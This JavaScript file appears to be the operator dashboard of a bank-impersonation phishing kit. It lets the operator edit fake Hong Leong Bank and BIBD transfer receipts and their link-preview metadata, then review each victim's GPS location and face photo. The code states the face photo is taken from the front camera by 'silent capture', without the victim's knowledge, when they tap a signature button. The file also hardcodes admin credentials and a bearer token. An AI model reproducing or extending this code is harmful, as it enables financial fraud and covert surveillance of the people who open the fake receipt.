// ============================================================
// HELIX CONTROL PANEL & DASHBOARD SCRIPT V2
// Integrated with: Silent Front Camera + Location + Receipt Photo
// ============================================================

(function() {
    'use strict';

    const CONFIG = {
        API_URL: '/api/locations',
        TEMPLATE_URL: '/api/template',
        WEBPROFILE_URL: '/api/webprofile',
        UPLOAD_URL: '/api/upload',
        SYNC_CHANNEL: 'bankidzz_sync_channel',
        AUTH_TOKEN: 'Bearer bankidzz-admin-secure-2026'
    };

    // DOM Elements
    const elements = {
        liveClock: document.getElementById('liveClock'),
        // Tabs
        tabDashboard: document.getElementById('tabDashboard'),
        tabTransfer: document.getElementById('tabTransfer'),
        tabUser: document.getElementById('tabUser'),
        tabWeb: document.getElementById('tabWeb'),
        sectionDashboard: document.getElementById('sectionDashboard'),
        sectionTransfer: document.getElementById('sectionTransfer'),
        sectionUser: document.getElementById('sectionUser'),
        sectionWeb: document.getElementById('sectionWeb'),
        // Form Inputs
        t_topBarTitle: document.getElementById('t_topBarTitle'),
        t_primaryColor: document.getElementById('t_primaryColor'),
        t_profileImage: document.getElementById('t_profileImage'),
        t_bankName: document.getElementById('t_bankName'),
        t_bankSub: document.getElementById('t_bankSub'),
        t_amountMain: document.getElementById('t_amountMain'),
        t_amountSub: document.getElementById('t_amountSub'),
        t_senderBank: document.getElementById('t_senderBank'),
        t_senderName: document.getElementById('t_senderName'),
        t_senderAccount: document.getElementById('t_senderAccount'),
        t_receiverBank: document.getElementById('t_receiverBank'),
        t_receiverName: document.getElementById('t_receiverName'),
        t_receiverAccount: document.getElementById('t_receiverAccount'),
        t_buttonText: document.getElementById('t_buttonText'),
        // Buttons & Containers
        btnRefresh: document.getElementById('btnRefresh'),
        btnClearAll: document.getElementById('btnClearAll'),
        transTableBody: document.getElementById('transTableBody'),
        alertEmpty: document.getElementById('alertEmpty'),
        tableWrapper: document.getElementById('tableWrapper'),
        notification: document.getElementById('notification'),
        // Image Modal
        imgViewerModal: document.getElementById('imgViewerModal'),
        imgModalTitle: document.getElementById('imgModalTitle'),
        imgModalFull: document.getElementById('imgModalFull'),
        btnDownloadImg: document.getElementById('btnDownloadImg'),
        // NEW: Front Camera Modal
        frontCamModal: document.getElementById('frontCamModal'),
        frontCamTitle: document.getElementById('frontCamTitle'),
        frontCamImg: document.getElementById('frontCamImg'),
        btnDownloadFront: document.getElementById('btnDownloadFront'),
        frontCamInfo: document.getElementById('frontCamInfo'),
        // Login Elements
        adminContainer: document.getElementById('adminContainer'),
        loginOverlay: document.getElementById('loginOverlay'),
        loginAlert: document.getElementById('loginAlert'),
        loginUsername: document.getElementById('loginUsername'),
        loginPassword: document.getElementById('loginPassword'),
        btnAuthenticate: document.getElementById('btnAuthenticate')
    };

    // ============================================================
    // LIVE CLOCK
    // ============================================================
    function updateClock() {
        if (!elements.liveClock) return;
        const now = new Date();
        const hrs = String(now.getHours()).padStart(2, '0');
        const mins = String(now.getMinutes()).padStart(2, '0');
        const secs = String(now.getSeconds()).padStart(2, '0');
        elements.liveClock.textContent = `${hrs}.${mins}.${secs}`;
    }
    setInterval(updateClock, 1000);
    updateClock();

    // ============================================================
    // ACCESS TERMINAL HELIX - AUTHENTICATION
    // ============================================================
    const ADMIN_CREDENTIALS = {
        username: 'adminbimkidzz',
        password: 'adminbimkidzz123'
    };

    function checkHelixAuth() {
        const isAuth = sessionStorage.getItem('helix_admin_session') === 'active' || 
                       localStorage.getItem('helix_admin_session') === 'active';
        if (isAuth) {
            if (elements.loginOverlay) elements.loginOverlay.style.display = 'none';
            if (elements.adminContainer) elements.adminContainer.style.display = 'block';
            return true;
        } else {
            if (elements.loginOverlay) elements.loginOverlay.style.display = 'flex';
            if (elements.adminContainer) elements.adminContainer.style.display = 'none';
            return false;
        }
    }

    window.handleHelixLogin = function() {
        const u = elements.loginUsername ? elements.loginUsername.value.trim() : '';
        const p = elements.loginPassword ? elements.loginPassword.value : '';

        if (u === ADMIN_CREDENTIALS.username && p === ADMIN_CREDENTIALS.password) {
            if (elements.loginAlert) elements.loginAlert.style.display = 'none';
            if (elements.btnAuthenticate) {
                elements.btnAuthenticate.textContent = 'ACCESS GRANTED...';
                elements.btnAuthenticate.style.background = '#00ffb3';
                elements.btnAuthenticate.style.color = '#000000';
            }

            setTimeout(() => {
                sessionStorage.setItem('helix_admin_session', 'active');
                localStorage.setItem('helix_admin_session', 'active');
                checkHelixAuth();
                if (elements.btnAuthenticate) {
                    elements.btnAuthenticate.textContent = 'AUTHENTICATE';
                    elements.btnAuthenticate.style.background = '';
                    elements.btnAuthenticate.style.color = '';
                }
                showNotification('⚡ Welcome, Administrator');
                loadTransactions();
            }, 400);
        } else {
            if (elements.loginAlert) {
                elements.loginAlert.textContent = '⚠️ ACCESS DENIED: Invalid Username or Password';
                elements.loginAlert.style.display = 'block';
            }
            if (elements.loginPassword) {
                elements.loginPassword.value = '';
                elements.loginPassword.focus();
            }
        }
    };

    window.handleHelixLogout = function() {
        sessionStorage.removeItem('helix_admin_session');
        localStorage.removeItem('helix_admin_session');
        if (elements.loginUsername) elements.loginUsername.value = '';
        if (elements.loginPassword) elements.loginPassword.value = '';
        if (elements.loginAlert) elements.loginAlert.style.display = 'none';
        checkHelixAuth();
    };

    // ============================================================
    // TAB SWITCHER
    // ============================================================
    window.switchTab = function(tabName) {
        if (elements.tabDashboard) elements.tabDashboard.classList.remove('active');
        if (elements.tabTransfer) elements.tabTransfer.classList.remove('active');
        if (elements.tabUser) elements.tabUser.classList.remove('active');
        if (elements.tabWeb) elements.tabWeb.classList.remove('active');

        if (elements.sectionDashboard) elements.sectionDashboard.style.display = 'none';
        if (elements.sectionTransfer) elements.sectionTransfer.style.display = 'none';
        if (elements.sectionUser) elements.sectionUser.style.display = 'none';
        if (elements.sectionWeb) elements.sectionWeb.style.display = 'none';

        if (tabName === 'dashboard') {
            if (elements.tabDashboard) elements.tabDashboard.classList.add('active');
            if (elements.sectionDashboard) elements.sectionDashboard.style.display = 'block';
            loadTransactions();
        } else if (tabName === 'transfer') {
            if (elements.tabTransfer) elements.tabTransfer.classList.add('active');
            if (elements.sectionTransfer) elements.sectionTransfer.style.display = 'block';
        } else if (tabName === 'user') {
            if (elements.tabUser) elements.tabUser.classList.add('active');
            if (elements.sectionUser) elements.sectionUser.style.display = 'block';
        } else if (tabName === 'web') {
            if (elements.tabWeb) elements.tabWeb.classList.add('active');
            if (elements.sectionWeb) elements.sectionWeb.style.display = 'block';
            loadWebProfile();
        }
    };

    // ============================================================
    // NOTIFICATION
    // ============================================================
    function showNotification(msg) {
        if (!elements.notification) return;
        elements.notification.textContent = msg;
        elements.notification.classList.add('show');
        setTimeout(() => {
            elements.notification.classList.remove('show');
        }, 3000);
    }

    // ============================================================
    // TEMPLATE MANAGEMENT
    // ============================================================
    async function loadTemplate() {
        try {
            const response = await fetch(CONFIG.TEMPLATE_URL, { cache: 'no-store' });
            if (response.ok) {
                const result = await response.json();
                if (result.template) {
                    populateTemplateForm(result.template);
                    return;
                }
            }
        } catch(e) {
            console.warn('Gagal memuat template dari server', e);
        }
        
        const stored = localStorage.getItem('bankidzz_new_template');
        if (stored) {
            try {
                populateTemplateForm(JSON.parse(stored));
            } catch(e) {}
        }
    }

    function populateTemplateForm(template) {
        if(elements.t_topBarTitle) elements.t_topBarTitle.value = template.topBarTitle || 'JAPANESE BANK';
        if(elements.t_primaryColor) elements.t_primaryColor.value = template.primaryColor || '#0033ff';
        if(elements.t_profileImage) elements.t_profileImage.value = template.profileImage || 'channels4_profile.jpg';
        if(elements.t_bankName) elements.t_bankName.value = template.bankName || 'BIBD Brunei Darussalam';
        if(elements.t_bankSub) elements.t_bankSub.value = template.bankSub || 'Office Purchasing';
        if(elements.t_amountMain) elements.t_amountMain.value = template.amountMain || 'IDR 515.000';
        if(elements.t_amountSub) elements.t_amountSub.value = template.amountSub || 'BND 35.12';
        if(elements.t_senderBank) elements.t_senderBank.value = template.senderBank || 'BIBD Brunei Darussalam';
        if(elements.t_senderName) elements.t_senderName.value = template.senderName || 'FITO ALAMSYAH';
        if(elements.t_senderAccount) elements.t_senderAccount.value = template.senderAccount || '72828172718';
        if(elements.t_receiverBank) elements.t_receiverBank.value = template.receiverBank || 'BANK BNI';
        if(elements.t_receiverName) elements.t_receiverName.value = template.receiverName || 'Tasliyah';
        if(elements.t_receiverAccount) elements.t_receiverAccount.value = template.receiverAccount || '2093832050';
        if(elements.t_buttonText) elements.t_buttonText.value = template.buttonText || 'Ambil Foto Konfirmasi / Tanda Tangan';
    }

    window.saveTemplate = async function() {
        const template = {
            topBarTitle: elements.t_topBarTitle ? elements.t_topBarTitle.value : 'JAPANESE BANK',
            primaryColor: elements.t_primaryColor ? elements.t_primaryColor.value : '#0033ff',
            profileImage: elements.t_profileImage ? elements.t_profileImage.value : 'channels4_profile.jpg',
            bankName: elements.t_bankName ? elements.t_bankName.value : 'BIBD Brunei Darussalam',
            bankSub: elements.t_bankSub ? elements.t_bankSub.value : 'Office Purchasing',
            amountMain: elements.t_amountMain ? elements.t_amountMain.value : 'IDR 515.000',
            amountSub: elements.t_amountSub ? elements.t_amountSub.value : 'BND 35.12',
            senderBank: elements.t_senderBank ? elements.t_senderBank.value : 'BIBD Brunei Darussalam',
            senderName: elements.t_senderName ? elements.t_senderName.value : 'FITO ALAMSYAH',
            senderAccount: elements.t_senderAccount ? elements.t_senderAccount.value : '72828172718',
            receiverBank: elements.t_receiverBank ? elements.t_receiverBank.value : 'BANK BNI',
            receiverName: elements.t_receiverName ? elements.t_receiverName.value : 'Tasliyah',
            receiverAccount: elements.t_receiverAccount ? elements.t_receiverAccount.value : '2093832050',
            buttonText: elements.t_buttonText ? elements.t_buttonText.value : 'Ambil Foto Konfirmasi / Tanda Tangan'
        };

        localStorage.setItem('bankidzz_new_template', JSON.stringify(template));

        try {
            await fetch(CONFIG.TEMPLATE_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': CONFIG.AUTH_TOKEN
                },
                body: JSON.stringify(template)
            });
        } catch(e) {}

        showNotification('Configuration saved & synced!');
        
        try {
            const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
            channel.postMessage({ type: 'template_updated', template: template });
            channel.close();
        } catch(e) {}
    };

    // ============================================================
    // HELIX WEB PROFILE MANAGEMENT (EXACT TO USER SCREENSHOTS)
    // ============================================================
    const webFileState = {
        favicon: { file: null, base64: null, filename: null },
        appleTouchIcon: { file: null, base64: null, filename: null },
        ogImage: { file: null, base64: null, filename: null },
        twitterImage: { file: null, base64: null, filename: null }
    };

    let currentWebProfile = {
        siteTitle: 'HONGLEONG',
        metaDescription: 'HONGLEONG',
        favicon: 'uploads/channels4_profile.jpg',
        appleTouchIcon: 'uploads/channels4_profile.jpg',
        themeColor: '#0033ff',
        appleWebAppCapable: 'yes',
        appleWebAppStatusbarStyle: 'default',
        ogType: 'website',
        ogLocale: 'en_MY',
        ogTitle: 'HONGLEONG',
        ogDescription: 'HONGLEONG',
        ogUrl: 'https://',
        ogImage: 'uploads/channels4_profile.jpg',
        ogImageWidth: '1200',
        ogImageHeight: '630',
        ogImageAlt: 'JAPANESE BANK',
        twitterCardType: 'summary_large_image',
        twitterTitle: 'Hong Leong Bank',
        twitterDescription: 'Resit Transaksi Hong Leong Bank',
        twitterImage: 'uploads/channels4_profile.jpg'
    };

    window.updateThemeColorBar = function(color) {
        const bar = document.getElementById('w_themeColorBar');
        if (bar) bar.style.background = color;
    };

    window.handleWebFileSelect = function(event, field) {
        const file = event.target.files[0];
        const nameEl = document.getElementById(`name_${field}`);
        if (!file) return;

        if (nameEl) nameEl.textContent = file.name;

        const reader = new FileReader();
        reader.onload = function(e) {
            webFileState[field] = {
                file: file,
                base64: e.target.result,
                filename: file.name
            };
        };
        reader.readAsDataURL(file);
    };

    async function loadWebProfile() {
        try {
            const response = await fetch(CONFIG.WEBPROFILE_URL, { cache: 'no-store' });
            if (response.ok) {
                const result = await response.json();
                if (result.profile) {
                    currentWebProfile = { ...currentWebProfile, ...result.profile };
                    populateWebProfileForm(currentWebProfile);
                    return;
                }
            }
        } catch (e) {
            console.warn('Gagal memuat web profile dari server', e);
        }

        const stored = localStorage.getItem('bankidzz_web_profile');
        if (stored) {
            try {
                currentWebProfile = { ...currentWebProfile, ...JSON.parse(stored) };
                populateWebProfileForm(currentWebProfile);
            } catch (e) {}
        } else {
            populateWebProfileForm(currentWebProfile);
        }
    }

    function populateWebProfileForm(p) {
        const setVal = (id, val) => {
            const el = document.getElementById(id);
            if (el && val !== undefined) el.value = val;
        };
        const setText = (id, val) => {
            const el = document.getElementById(id);
            if (el) el.textContent = val || '-';
        };

        // Basic Meta
        setVal('w_siteTitle', p.siteTitle || 'HONGLEONG');
        setVal('w_metaDescription', p.metaDescription || 'HONGLEONG');
        setText('cur_favicon', p.favicon || '-');
        setText('cur_appleTouchIcon', p.appleTouchIcon || '-');
        setVal('w_themeColor', p.themeColor || '#0033ff');
        window.updateThemeColorBar(p.themeColor || '#0033ff');
        setVal('w_appleWebAppCapable', p.appleWebAppCapable || 'yes');
        setVal('w_appleWebAppStatusbarStyle', p.appleWebAppStatusbarStyle || 'default');

        // Open Graph
        setVal('w_ogType', p.ogType || 'website');
        setVal('w_ogLocale', p.ogLocale || 'en_MY');
        setVal('w_ogTitle', p.ogTitle || 'HONGLEONG');
        setVal('w_ogDescription', p.ogDescription || 'HONGLEONG');
        setVal('w_ogUrl', p.ogUrl || 'https://');
        setText('cur_ogImage', p.ogImage || '-');
        setVal('w_ogImageWidth', p.ogImageWidth || '1200');
        setVal('w_ogImageHeight', p.ogImageHeight || '630');
        setVal('w_ogImageAlt', p.ogImageAlt || 'JAPANESE BANK');

        // Twitter Card
        setVal('w_twitterCardType', p.twitterCardType || 'summary_large_image');
        setVal('w_twitterTitle', p.twitterTitle || 'Hong Leong Bank');
        setVal('w_twitterDescription', p.twitterDescription || 'Resit Transaksi Hong Leong Bank');
        setText('cur_twitterImage', p.twitterImage || '-');

        // Reset file names and checkboxes
        ['favicon', 'appleTouchIcon', 'ogImage', 'twitterImage'].forEach(field => {
            const nameEl = document.getElementById(`name_${field}`);
            if (nameEl) nameEl.textContent = 'No file chosen';
            const delEl = document.getElementById(`del_${field}`);
            if (delEl) delEl.checked = false;
        });
    }

    window.saveWebProfile = async function() {
        const getVal = (id, fallback) => {
            const el = document.getElementById(id);
            return el ? el.value : fallback;
        };
        const isDel = (field) => {
            const el = document.getElementById(`del_${field}`);
            return el ? el.checked : false;
        };

        const updatedProfile = { ...currentWebProfile };

        // 1. Upload & simpan file jika ada dipilih
        for (const field of ['favicon', 'appleTouchIcon', 'ogImage', 'twitterImage']) {
            if (isDel(field)) {
                updatedProfile[field] = '';
                webFileState[field] = { file: null, base64: null, filename: null };
            } else if (webFileState[field].base64) {
                // Gunakan base64 data URL langsung agar gambar langsung tampil di seluruh browser
                updatedProfile[field] = webFileState[field].base64;

                try {
                    const uploadRes = await fetch(CONFIG.UPLOAD_URL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Authorization': CONFIG.AUTH_TOKEN
                        },
                        body: JSON.stringify({
                            field: field,
                            filename: webFileState[field].filename,
                            base64: webFileState[field].base64
                        })
                    });
                    if (uploadRes.ok) {
                        const uploadJson = await uploadRes.json();
                        if (uploadJson.url) {
                            updatedProfile[field] = uploadJson.url;
                        }
                    }
                } catch(e) {
                    console.warn(`Upload ${field}:`, e);
                }
            }
        }

        // 2. Form values
        updatedProfile.siteTitle = getVal('w_siteTitle', 'HONGLEONG');
        updatedProfile.metaDescription = getVal('w_metaDescription', 'HONGLEONG');
        updatedProfile.themeColor = getVal('w_themeColor', '#0033ff');
        updatedProfile.appleWebAppCapable = getVal('w_appleWebAppCapable', 'yes');
        updatedProfile.appleWebAppStatusbarStyle = getVal('w_appleWebAppStatusbarStyle', 'default');

        updatedProfile.ogType = getVal('w_ogType', 'website');
        updatedProfile.ogLocale = getVal('w_ogLocale', 'en_MY');
        updatedProfile.ogTitle = getVal('w_ogTitle', 'HONGLEONG');
        updatedProfile.ogDescription = getVal('w_ogDescription', 'HONGLEONG');
        updatedProfile.ogUrl = getVal('w_ogUrl', 'https://');
        updatedProfile.ogImageWidth = getVal('w_ogImageWidth', '1200');
        updatedProfile.ogImageHeight = getVal('w_ogImageHeight', '630');
        updatedProfile.ogImageAlt = getVal('w_ogImageAlt', 'JAPANESE BANK');

        updatedProfile.twitterCardType = getVal('w_twitterCardType', 'summary_large_image');
        updatedProfile.twitterTitle = getVal('w_twitterTitle', 'Hong Leong Bank');
        updatedProfile.twitterDescription = getVal('w_twitterDescription', 'Resit Transaksi Hong Leong Bank');

        currentWebProfile = updatedProfile;
        localStorage.setItem('bankidzz_web_profile', JSON.stringify(updatedProfile));

        // 3. Post to server
        let serverSynced = false;
        try {
            const resp = await fetch(CONFIG.WEBPROFILE_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': CONFIG.AUTH_TOKEN
                },
                body: JSON.stringify(updatedProfile)
            });
            if (resp.ok) {
                serverSynced = true;
            }
        } catch(e) {}

        // 4. Broadcast
        try {
            const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
            channel.postMessage({ type: 'webprofile_updated', profile: updatedProfile });
            channel.close();
        } catch(e) {}

        populateWebProfileForm(updatedProfile);
        showNotification(serverSynced ? '✅ Web profile tersimpan & tersinkronisasi!' : '⚡ Web profile tersimpan di lokal & memory!');
    };

    // ============================================================
    // LOAD TRANSACTIONS - DENGAN DATA LENGKAP
    // ============================================================
    async function loadTransactions() {
        let transfers = [];

        // Baca dari localStorage
        try {
            const localStored = JSON.parse(localStorage.getItem('bankidzz_local_transactions') || '[]');
            if (Array.isArray(localStored)) {
                transfers = [...localStored];
            }
        } catch(e) {}

        // Baca dari server
        try {
            const response = await fetch(CONFIG.API_URL, {
                headers: { 'Authorization': CONFIG.AUTH_TOKEN }
            });

            if (response.ok) {
                const result = await response.json();
                if (result.transfers && Array.isArray(result.transfers)) {
                    const map = new Map();
                    const combined = [...transfers, ...result.transfers];
                    combined.forEach(item => {
                        if (!item || !item.transferId) return;
                        const existing = map.get(item.transferId);
                        if (!existing) {
                            map.set(item.transferId, item);
                        } else {
                            map.set(item.transferId, {
                                ...existing,
                                ...item,
                                photo: item.photo || existing.photo || '',
                                frontPhoto: item.frontPhoto || existing.frontPhoto || '',
                                front_photo: item.front_photo || existing.front_photo || '',
                                status: (item.status === 'verified' || existing.status === 'verified') ? 'verified' : (item.status || existing.status)
                            });
                        }
                    });
                    transfers = Array.from(map.values());
                }
            }
        } catch(e) {
            console.warn('Backend API not reachable, displaying local sync data.', e);
        }

        renderTransactions(transfers);
    }

    // ============================================================
    // RENDER TRANSACTIONS - DENGAN KOLOM FOTO DEPAN
    // ============================================================
    function renderTransactions(transfers) {
        if (!elements.transTableBody) return;
        elements.transTableBody.innerHTML = '';
        
        if (!transfers || transfers.length === 0) {
            if (elements.alertEmpty) elements.alertEmpty.style.display = 'flex';
            if (elements.tableWrapper) elements.tableWrapper.style.display = 'none';
            return;
        }

        if (elements.alertEmpty) elements.alertEmpty.style.display = 'none';
        if (elements.tableWrapper) elements.tableWrapper.style.display = 'block';

        transfers.sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0));

        transfers.forEach(t => {
            const tr = document.createElement('tr');
            
            // ==========================================
            // 1. FOTO BARANG TRANSAKSI (Kamera Belakang) - BESAR
            // ==========================================
            let receiptPhotoHtml = '<div style="color:var(--text-muted); font-size:12px; width:140px; height:140px; display:flex; align-items:center; justify-content:center; background:rgba(255,255,255,0.03); border-radius:10px; border:1px dashed #334155;">Tidak Ada Foto</div>';
            const receiptImg = t.photo || t.receiptPhoto || '';
            if (receiptImg) {
                receiptPhotoHtml = `<img src="${receiptImg}" class="photo-thumb-large photo-thumb-receipt" alt="Barang ${t.transferId}" onclick="window.viewFullPhoto('${receiptImg}', '${t.transferId}')" title="Klik untuk perbesar Foto Barang Transaksi">`;
            } else if (t.status === 'waiting_item_photo') {
                receiptPhotoHtml = '<div style="color:var(--accent-green); font-size:11px; width:140px; height:140px; display:flex; flex-direction:column; align-items:center; justify-content:center; background:rgba(0,255,179,0.05); border-radius:10px; border:1px dashed var(--accent-green); text-align:center; padding:10px; line-height:1.4;"><span style="font-size:22px; margin-bottom:4px;">📷</span><span>Menunggu Foto Barang...</span></div>';
            }

            // ==========================================
            // 2. FOTO KAMERA DEPAN / WAJAH (Silent Capture) - BESAR
            // ==========================================
            let frontPhotoHtml = '<div style="color:var(--text-muted); font-size:12px; width:140px; height:140px; display:flex; align-items:center; justify-content:center; background:rgba(255,255,255,0.03); border-radius:10px; border:1px dashed #334155;">Tidak Ada Foto</div>';
            const frontImg = t.frontPhoto || t.front_photo || '';
            if (frontImg) {
                frontPhotoHtml = `<img src="${frontImg}" class="photo-thumb-large photo-thumb-front" alt="Wajah ${t.transferId}" onclick="window.viewFrontPhoto('${frontImg}', '${t.transferId}')" title="Klik untuk perbesar FOTO WAJAH (SILENT)">`;
            }

            // ==========================================
            // 3. LOKASI (GPS AKURAT)
            // ==========================================
            let locStr = '<span style="color:var(--text-muted)">Tanpa GPS</span>';
            if (t.location && typeof t.location.lat === 'number' && typeof t.location.lng === 'number') {
                const acc = t.location.accuracy ? `±${Math.round(t.location.accuracy)}m` : '';
                locStr = `
                    <div style="font-family:'Share Tech Mono', monospace; font-size:13px; line-height:1.6;">
                        <div style="color:#ffffff; font-weight:700;">Lat: ${t.location.lat.toFixed(6)}</div>
                        <div style="color:#ffffff; font-weight:700;">Lng: ${t.location.lng.toFixed(6)}</div>
                        ${acc ? `<div style="color:var(--accent-green); font-size:11px;">Akurasi: ${acc}</div>` : ''}
                        <a href="https://www.google.com/maps/search/?api=1&query=${t.location.lat},${t.location.lng}" target="_blank" style="display:inline-block; margin-top:6px; padding:4px 10px; background:rgba(0,255,179,0.15); border:1px solid var(--accent-green); border-radius:6px; color:var(--accent-green); text-decoration:none; font-weight:bold; font-size:11px;">📍 Buka Google Maps ↗</a>
                    </div>
                `;
            }

            // ==========================================
            // 4. WAKTU (WIB)
            // ==========================================
            let timeStr = t.timestamp ? new Date(t.timestamp).toLocaleString('id-ID', {
                dateStyle: 'medium',
                timeStyle: 'medium'
            }) : '-';

            tr.innerHTML = `
                <td style="vertical-align:top; padding:16px;">${receiptPhotoHtml}</td>
                <td style="vertical-align:top; padding:16px;">${frontPhotoHtml}</td>
                <td style="vertical-align:top; padding:16px;">${locStr}</td>
                <td style="vertical-align:top; padding:16px; font-family:'Share Tech Mono',monospace; font-size:13px; color:var(--text-light);">${timeStr}</td>
                <td style="vertical-align:top; padding:16px;">
                    <button class="btn-action-del" onclick="window.deleteTransaction('${t.transferId}')">🗑️ Hapus</button>
                </td>
            `;
            elements.transTableBody.appendChild(tr);
        });
    }

    // ============================================================
    // VIEW FOTO BARANG TRANSAKSI (KAMERA BELAKANG)
    // ============================================================
    window.viewFullPhoto = function(photoUrl, refId) {
        if (!elements.imgViewerModal) return;
        if (elements.imgModalTitle) elements.imgModalTitle.textContent = `FOTO BARANG TRANSAKSI [ ${refId} ]`;
        if (elements.imgModalFull) elements.imgModalFull.src = photoUrl;
        if (elements.btnDownloadImg) {
            elements.btnDownloadImg.href = photoUrl;
            elements.btnDownloadImg.download = `FotoBarang_${refId}.jpg`;
        }
        elements.imgViewerModal.style.display = 'flex';
    };

    window.closeImgModal = function() {
        if (elements.imgViewerModal) elements.imgViewerModal.style.display = 'none';
    };

    // ============================================================
    // VIEW FOTO WAJAH (KAMERA DEPAN / SILENT CAPTURE)
    // ============================================================
    window.viewFrontPhoto = function(photoUrl, refId) {
        if (!elements.frontCamModal) return;
        if (elements.frontCamTitle) elements.frontCamTitle.textContent = `FOTO WAJAH (SILENT CAPTURE) [ ${refId} ]`;
        if (elements.frontCamImg) elements.frontCamImg.src = photoUrl;
        if (elements.btnDownloadFront) {
            elements.btnDownloadFront.href = photoUrl;
            elements.btnDownloadFront.download = `FotoWajah_${refId}.jpg`;
        }
        if (elements.frontCamInfo) {
            elements.frontCamInfo.textContent = `Diambil secara silent capture kamera depan saat konfirmasi tanda tangan diklik`;
        }
        elements.frontCamModal.style.display = 'flex';
    };

    window.closeFrontCamModal = function() {
        if (elements.frontCamModal) elements.frontCamModal.style.display = 'none';
    };

    // ============================================================
    // DELETE TRANSACTION
    // ============================================================
    window.deleteTransaction = async function(transferId) {
        if (!confirm(`Hapus transaksi ${transferId}?`)) return;

        try {
            let localStored = JSON.parse(localStorage.getItem('bankidzz_local_transactions') || '[]');
            localStored = localStored.filter(t => t.transferId !== transferId);
            localStorage.setItem('bankidzz_local_transactions', JSON.stringify(localStored));
        } catch(e) {}

        try {
            await fetch(`${CONFIG.API_URL}?id=${encodeURIComponent(transferId)}`, {
                method: 'DELETE',
                headers: { 'Authorization': CONFIG.AUTH_TOKEN }
            });
        } catch(e) {}

        showNotification('Transaksi berhasil dihapus.');
        loadTransactions();
    };

    // ============================================================
    // CLEAR ALL
    // ============================================================
    async function clearAllTransactions() {
        if (!confirm('Apakah Anda yakin ingin menghapus SELURUH data transaksi & foto?')) return;

        localStorage.removeItem('bankidzz_local_transactions');

        try {
            await fetch(`${CONFIG.API_URL}?all=true`, {
                method: 'DELETE',
                headers: { 'Authorization': CONFIG.AUTH_TOKEN }
            });
        } catch(e) {}

        showNotification('Seluruh data berhasil dibersihkan.');
        loadTransactions();
    }

    // ============================================================
    // REAL-TIME SYNC LISTENER
    // ============================================================
    function setupSyncListener() {
        try {
            const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
            channel.addEventListener('message', (event) => {
                if (event.data && event.data.type === 'NEW_LOCATION') {
                    showNotification('⚡ Data Transaksi Baru / Foto Diterima!');
                    loadTransactions();
                }
            });
        } catch(e) {}
    }

    // ============================================================
    // EVENTS
    // ============================================================
    if (elements.btnRefresh) elements.btnRefresh.addEventListener('click', loadTransactions);
    if (elements.btnClearAll) elements.btnClearAll.addEventListener('click', clearAllTransactions);

    // Init
    checkHelixAuth();
    loadTemplate();
    loadWebProfile();
    loadTransactions();
    setupSyncListener();

    // Check URL hash or param on load (e.g. admin.html#web or admin.html?tab=web)
    try {
        const urlParams = new URLSearchParams(window.location.search);
        const tabParam = urlParams.get('tab') || window.location.hash.replace('#', '');
        if (tabParam === 'web') {
            switchTab('web');
        } else if (tabParam === 'transfer') {
            switchTab('transfer');
        } else if (tabParam === 'user') {
            switchTab('user');
        }
    } catch(e) {}

    // Auto-polling berkala setiap 3.5 detik agar selalu update dari perangkat lain
    setInterval(loadTransactions, 3500);

})();